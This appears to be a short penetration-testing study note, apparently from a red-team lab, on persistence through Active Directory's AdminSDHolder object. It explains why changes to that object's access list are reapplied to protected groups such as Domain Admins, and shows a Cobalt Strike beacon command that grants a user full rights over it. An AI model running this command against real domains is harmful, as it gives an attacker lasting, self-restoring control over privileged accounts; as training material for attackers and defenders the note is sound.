# [[AdminSDHolder]]  
___

## Description:  

TheÂ **AdminSDHolder**Â is a DACL template used to protect sensitive principals from modification.

The AdminSDHolder itself is not protected so if we modify the DACL on it, those changes will be replicated to the subsequent objects. So even if an admin see's a rogue DACL on group such as the DA's and removes it, it will just be reapplied again.

```
beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All

```

Once this propagates, the principal will have full control over the aforementioned sensitive principals.
